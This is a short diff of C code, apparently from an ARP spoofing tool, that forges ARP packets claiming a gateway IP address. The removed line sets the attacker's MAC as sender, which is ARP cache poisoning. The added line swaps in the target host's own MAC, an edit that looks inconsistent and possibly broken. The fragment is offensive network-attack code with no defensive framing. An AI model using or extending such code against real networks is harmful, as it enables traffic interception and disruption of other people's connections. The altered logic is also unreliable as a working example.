@@ -110,7 +110,7 @@ int main(int argc, char *argv[]) {
     memcpy(eh->ether_dhost, bcast,   ETH_ALEN);
     eh->ether_type = htons(ETH_P_ARP);
     // ARP payload: target is host_mac
-    memcpy(arp->arp_sha, atk_mac,  ETH_ALEN); /* sender hardware (MAC) address */
+    memcpy(arp->arp_sha, host_mac,  ETH_ALEN); /* sender hardware (MAC) address */
     memcpy(&arp->arp_spa, &gw_ip, sizeof(gw_ip));/* sender protocol (IPv4) address */
     memcpy(arp->arp_tha, host_mac, ETH_ALEN);/* target hardware (MAC) address */
     memcpy(&arp->arp_tpa, &host_ip, sizeof(host_ip));/* target protocol (IPv4) address */
